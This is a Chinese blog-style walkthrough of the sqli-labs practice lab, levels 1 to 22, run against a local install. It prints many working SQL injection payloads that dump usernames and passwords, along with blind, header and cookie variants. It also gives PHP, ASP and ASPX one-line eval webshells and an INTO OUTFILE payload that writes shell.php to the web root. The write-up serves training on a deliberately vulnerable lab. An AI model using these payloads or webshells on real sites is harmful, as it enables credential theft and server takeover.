---
title: sqli-labs通关笔记
---

# sqli-labs通关笔记

## union注入

### Sqli-labs-Less-1

根据[我的上篇文章](https://www.zhiji.icu/2021/03/06/qian-tan-sql-zhu-ru/)中的技巧可轻松判断注入类型，为字符型注入

当我们使用?id=1’时报错，说明存在注入点

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql-p1-11.png)

使用order by 查看字段数量

使用order by 3 没有报错 使用order by 4 发生报错，说明字段数为3

查看哪些数据可以回显
将?id=1改为?id=-1 或者其它不存在的值，使用union注入

```sql
http://127.0.0.1/SQL1/Less-1/?id=-1' union select 1,2,3--+
```

可以看到2，3发生回显，确定注入点为2，3，直接在2的位子输入sql语句进行注入查询

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql-p1-12.png)

查看版本和数据库名

```sql
http://127.0.0.1/SQL1/Less-1/?id=-1' union select 1,version(),database()--+
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql-p1-3.png)

查看数据库（group_concat()将查询的字段数合并一起输出）

```sql
http://127.0.0.1/SQL1/Less-1/?id=-1' union select 1,2,group_concat(schema_name)  from information_schema.schemata--+
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql-p1-13.png)

这里我们已经查询到security数据库，下面继续查询security库里面的表

```sql
http://127.0.0.1/SQL1/Less-1/?id=-1' union select 1,2,group_concat(table_name)  from information_schema.tables where table_schema='security'--+
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql-p1-14.png)

这里我们已经查询到users表,继续查询users表里面的字段

```sql
http://127.0.0.1/SQL1/Less-1/?id=-1' union select 1,2,group_concat(column_name)  from information_schema.columns where table_name='users'--+
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql-p1-15.png)

这里我们已经查询到username 和password字段,继续查询username 和password,这里引入一个函数concat_ws(‘a’,b,c)，他会将b和c之间用a分割

```sql
http://127.0.0.1/SQL1/Less-1/?id=-1' union select 1,2,group_concat(concat_ws('-',username,password))  from security.users--+
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql-p1-9.png)

至此我们就已经拿到所有的用户账号和密码。

### Sqli-labs-Less-2

```sql
http://127.0.0.1/SQL1/Less-2/?id=1  #正常回显
http://127.0.0.1/SQL1/Less-2/?id=1' #有报错
```

判断为数字型注入

使用order by 3 没有报错 使用order by 4 发生报错，说明字段数为3

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql-p2-1.png)

查看哪些数据可以回显，将?id=1改为?id=-1 或者其它不存在的值，使用union注入 且通过order by结果为3 可以得到

```sql
http://127.0.0.1/SQL1/Less-2/?id=-1 union select 1,2,3
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql-p2-2.png)

我们看到数据2,3发生回显，以下步骤与Sqli-labs-Less-1一样，这里就不再赘述。

### Sqli-labs-Less-3

当我们使用?id=1时没有报错,使用?id=1'报错并且提示我们少了个)

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql-p3-1.png)

因此得出这一关可直接使用?id=1’) 来进行注入攻击

使用order by 3 没有报错 使用order by 4 发生报错，说明字段数为3

```sql
http://127.0.0.1/SQL1/Less-3/?id=1') order by 4--+
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql-p3-3.png)

查看哪些数据可以回显,将?id=1)改为?id=-1)或者其它不存在的值，使用union注入 且通过order by结果为3 可以得到

```sql
http://127.0.0.1/SQL1/Less-3/?id=-1') union select 1,2,3--+
```

我们看到数据2,3发生回显![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql-p3-4.png)

后面的步骤与Sqli-labs-Less-1一样，这里就不再赘述。

### Sqli-labs-Less-4

这里输入?id=1‘不报错，当我们使用?id=1’)时也没有报错，当我们使用?id=1''时报错

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql-p4-1.png)

这里提示我们少了个)

因此得出这一关可直接使用?id=1") 来进行注入攻击

使用order by 3 没有报错 使用order by 4 发生报错，说明字段数为3

将?id=1改为?id=-1 或者其它不存在的值，使用union注入且通过order by结果为3 

```
http://127.0.0.1/SQL1/Less-4/?id=-1") union select 1,2,3--+
```

我们看到数据2,3发生回显

下面的步骤和Sqli-labs-Less-1的一样，这里就不再赘述

## 双查询注入

### Sqli-labs-Less-5

当我们尝试输入id=1时，页面不会再返回用户名和密码，而是返回了 You are in………..

```http
http://127.0.0.1/sql1/Less-5/?id=1
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql1-p5-1.png)

输入`id=1'`这里报错，根据错误信息我们判断为字符型注入

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql1-p5-2.png)

猜测查询语句

```sql
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

无回显，有报错，单引号闭合，布尔类型注入 或 双查询注入（布尔比较慢，这关采用双查询）

payload如下

```sql
XXX.php/?id=-1' union select 1,count(*), concat((select database()), floor(rand()*2))as a from information_schema.tables group by a --+
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql1-p5-3.png)

成功爆出库名，注意，由于有随机性，可能成功执行了语句所以不会报错，正常的显示页面（即不报错）如下

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql1-p5-4.png)

这种情况多提交几次就行，理论上每次都有百分之50的可能性，但可以通过修改rand()使用的种子来使其百分百报错,如下将rand()改为rand(1)，测试百分之百报错：

```sql
XXX.php/?id=-1' union select 1,count(*), concat((select database()), floor(rand(1)*2))as a from information_schema.tables group by a --+
```

获取库中表名

尝试在子查询中利用`group_concat`函数将几个表名直接连接在一起输出的，但是无用，不能触发报错，还是用limit函数，让查询结果每次一行的显示

```sql
http://127.0.0.1/sql1/Less-5/?id=1' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 0,1),floor(rand(14)*2))as a from information_schema.schemata group by a --+
```

改变limit函数的参数，依次为`limit 0,1`,`limit 1,1`，`limit 2,1`，`limit 3,1`，将4个表名爆出来

![sql1-p5-5](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql1-p5-5.png)

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql1-p5-6.png)

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql1-p5-7.png)

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql1-p5-8.png)

最终找到我们需要的表，`users`

获取目标表中的列数,payload如下

```sql
http://127.0.0.1/sql1/Less-5/?id=1' union select 1,count(*),concat((select count(column_name) from information_schema.columns where table_schema='security' and table_name="users"),floor(rand(13)*2)) as a from information_schema.tables where table_schema='security' group by a --+
```

然后通过limit函数将列名逐一爆出来，payload如下，改变limit的变量即可，下面省略获取过程，直接写payload

```sql
http://127.0.0.1/sql1/Less-5/?id=1' union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' and table_name="users" limit 0,1),floor(rand(12)*2)) as a from information_schema.tables where table_schema='security' group by a --+
```

从列中获取用户名,一样的改变limit参数，获得全部的用户名

```sql
http://127.0.0.1/sql1/Less-5/?id=1' union select 1,count(*),concat((select username from users limit 0,1),floor(rand(18)*2)) as a from security.users  group by a --+
```

用户名获取后再查密码

```sql
http://127.0.0.1/sql1/Less-5/?id=1' union select 1,count(*),concat((select password from users  where username='admin'),floor(rand(11)*2)) as a from users group by a --+
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql1-p5-9.png)

获取成功

### Sqli-labs-Less-6

Pass-6和Pass-5的基本思路一样，把第五关中的单引号换成双引号就行了。

双查询参考链接

[https://www.cnblogs.com/laoxiajiadeyun/p/10278512.html](https://www.cnblogs.com/laoxiajiadeyun/p/10278512.html)

[https://www.cnblogs.com/laoxiajiadeyun/p/10283251.html](https://www.cnblogs.com/laoxiajiadeyun/p/10283251.html)

## 文件导入注入

### Sqli-labs-Less-7

本关的标题是 dump into outfile,意思是本关我们利用文件导入的方式进行注入

知识点

load_file()函数读文件操作
`select load_file('/etc/passwd')`
into outfile写文件操作
`select '<?php phpinfo();?>' into outfile 'c:\wwwroot\1.php'`

一句话木马

```php
#php的一句话
<?php @eval($_POST['ckcadmin']);?> 
#asp的一句话
<%eval request ("ckcadmin")%> 
#aspx的一句话
<%@ Page Language="ckcadmin"%> <%eval(Request.Item["ckcadmin"],"unsafe");%>
```

payload

```sql
?id=1')) and 1=2--+
```

这里我们使用into outfile函数配合一句话木马去上传文件拿到网站的webshell

```sql
http://127.0.0.1/sql1/Less-7/?id=1')) union select 1,2,'<?php @eval($_POST["ckc"]);?>' into outfile "E:\\wamp64\\www\\sql1\\Less-7\\shell.php" --+
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql-p7-1.png)

成功写入，然后蚁剑连接即可

![sql-p7-3](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql-p7-3.png)

## 布尔类型注入

### Sqli-labs-Lass-8

payload

```sql
?id=1' and 1=1--+
```

猜测查询语句

```sql
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

无报错，无回显，单引号闭合，布尔类型注入

```sql
?id=1' and ascii(substr(database(),1,1))>=115--+
```

首先猜解数据库的长度。数据库猜解长度的函数length

```sql
?id=1' and length(database())>1--+ #肯定大于1，这个事实
?id=1' and length(database())>7--+ #大于7
?id=1' and length(database())>8--+ #不大于8
?id=1' and length(database())=8--+ #数据库等于8，然后呢！
```

通过ascii()和substr()猜测数据库名

```sql
ascii() #返回指定数字对应的ascii码字符函数
substr() #截取从pos位置开始到最后的所有str字符串
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql-p8-1.png)

然后猜解字符了，115对应字母s，然后按这个一个一个猜解，编辑坑爹呀！还是写个字典用burp跑
burp设置如下

设置变量

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql-p8-2.png)

设置参数

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql-p8-3.png)

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql-p8-4.png)

过滤

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql-p8-5.png)

按上面的配置完成后，按个爆破即可

## 延时注入

### Sql-labs-Less-9

paylaod

```sql
?id=1' and sleep(5)--+
```

```sql
?id=1' and if(ascii(substr(database(),1,1))>115, 0, sleep(5))--+
```

### Sql-labs-Less-10

paylaod

```sql
?id=2" and sleep(3)--+
```

无回显，双引号闭合，无报错，延时注入

```sql
?id=1" and if(ascii(substr(database(),1,1))>115, 0, sleep(5))--+
```

## POST注入

### Sql-labs-Less-11

POST请求发送的数据不会直接显示在浏览器端需要用到bp或者hackbar

paylaod

```sql
uname=1' order by 2#&passwd=1&submit=Submit
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql-p11-2.png)

确定回显位置

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql-p11-3.png)

后面的过程和Sql-labs-Less-1的union注入一样，就不再赘述

还可以用sqlmap

直接将 Burpsuite 截取的数据包内容保持为文本格式 sql11.txt

```http
POST /sql1/Less-11/ HTTP/1.1
Host: 127.0.0.1
Content-Length: 30
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1/sql1/Less-11/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

uname=1&passwd=s&submit=Submit
```

然后使用 sqlmap 的 -r 参数来加载这个请求包：

```python
python sqlmap.py -r sql11.txt
```

### Sql-labs-Less-12

有报错，有回显，双引号+括号闭合，union注入

可尝试联合、报错、布尔盲注、延时盲注

payload

```sql
uname=1") or 1=1#&passwd=&submit=Submit
```

### Sql-labs-Less-13

有报错，无回显，有布尔状态，单引号+括号闭合 报错注入

payload

```sql
uname=1') or 1=1#&passwd=&submit=Submit
```

### Sql-labs-Less-14

有报错，无回显，有布尔状态，双引号闭合 报错注入

payload

```sql
uname=1" or 1=1#&passwd=1&submit=Submit
```

### Sql-labs-Less-15

源码中注释掉了 MySQL 的报错日志，所以这里就不可以进行报错注入了，只能使用布尔盲注或者延时盲注

payload

```sql
uname=1' or length(database())>3#&passwd=1&submit=Submit
```

### Sql-labs-Less-16

和Sql-labs-Less-15一样，闭合方式不一样，双引号闭合

payload

```sql
uname=1") or length(database())>1#&passwd=1&submit=Submit
```

### Sql-labs-Less-17

这一关对用户名的过滤了，需要爆破用户名 admin，对密码没有过滤，

```sql
#uname 参数被过滤了
$uname=check_input($_POST['uname']);  
$passwd=$_POST['passwd'];
#SELECT 语句只获取 uname 参数
@$sql="SELECT username, password FROM users WHERE username= $uname LIMIT 0,1";
```

无回显，有报错，密码段无过滤，单引号闭合，报错注入

```sql
uname=admin&passwd=a' or updatexml(1,concat(0x7e,(database()),0x7e),1)#&submit=Submit
```

或者

```sql
uname=admin&passwd=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)#&submit=Submit
```

### Sql-labs-Less-18

User-Agent 注入

无回显，抓包修改user-Agent注入，有报错，单引号闭合

```sql
'or 1=1
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql-p18-1.png)

### Sql-labs-Less-19

Referer 注入

有回显，有报错，抓包修改Referer头注入，单引号闭合

```sql
'1 or 1=1
```

## Cookie 注入

### Sql-labs-Less-20

Cookie 注入

有回显，有报错，抓包修改Cookie注入，单引号闭合

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/sql-p20-1.png)

### Sql-labs-Less-21

跟Sql-labs-Less-20一样，把cookie base64就好了

### Sql-labs-Less-22

跟Sql-labs-Less-21关一样，不过是双引号闭合